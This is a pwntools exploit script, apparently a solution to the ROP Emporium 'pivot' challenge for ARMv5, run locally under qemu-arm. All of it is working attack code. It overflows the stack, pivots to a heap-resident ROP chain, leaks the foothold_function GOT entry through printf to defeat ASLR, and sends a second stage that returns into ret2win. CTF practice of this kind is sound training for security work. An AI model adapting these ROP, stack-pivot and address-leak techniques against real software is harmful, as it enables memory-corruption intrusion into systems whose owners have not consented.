from pwn import *

context.arch = 'arm'
context.log_level = 'info'

pop_csu       = 0x00010984
pivot_sp      = 0x000108f8
mov_r0_blx_r3 = 0x00010974
pop_r3_pc     = 0x000105d4
pop_r0_pc     = 0x000105f4
read_plt      = 0x000105f8

foothold_plt  = 0x0001064c
foothold_got  = 0x0002102c
printf_plt    = 0x000105ec
bss_addr      = 0x00022000

OFFSET = 36
OFFSET_RET2WIN = 0x18C

p = process(['qemu-arm', '-L', '../split/armroot', './pivot_armv5'])

p.recvuntil(b"pivot: ")
heap_addr = int(p.recvline().strip(), 16)
log.info(f"Heap address: {hex(heap_addr)}")

payload_heap  = p32(foothold_plt)

payload_heap += p32(pop_csu)
payload_heap += p32(0) * 3
payload_heap += p32(foothold_got)
payload_heap += p32(0) * 3
payload_heap += p32(pop_r3_pc)
payload_heap += p32(printf_plt)
payload_heap += p32(mov_r0_blx_r3)

payload_heap += p32(pop_csu)
payload_heap += p32(0)
payload_heap += p32(0)
payload_heap += p32(0)
payload_heap += p32(bss_addr)
payload_heap += p32(100)
payload_heap += p32(0)
payload_heap += p32(0)
payload_heap += p32(read_plt)

payload_heap += p32(pivot_sp)

payload_stack  = b'A' * OFFSET
payload_stack += p32(pop_csu)
payload_stack += p32(0)
payload_stack += p32(heap_addr)
payload_stack += p32(0) * 5
payload_stack += p32(pivot_sp)
payload_stack += p32(0)
payload_stack += p32(0)

p.sendline(payload_heap)
p.sendline(payload_stack)

p.recvuntil(b"Thank you!\n")
leaked_data = p.recv(4)
foothold_leak = u32(leaked_data)
log.info(f"{hex(foothold_leak)}")

ret2win_addr = foothold_leak + OFFSET_RET2WIN
log.info(f"{hex(ret2win_addr)}")

payload_stage2  = b'A' * OFFSET
payload_stage2 += p32(pop_r0_pc)
payload_stage2 += p32(0xdeadbeef) 
payload_stage2 += p32(ret2win_addr)

p.sendline(payload_stage2)

p.interactive()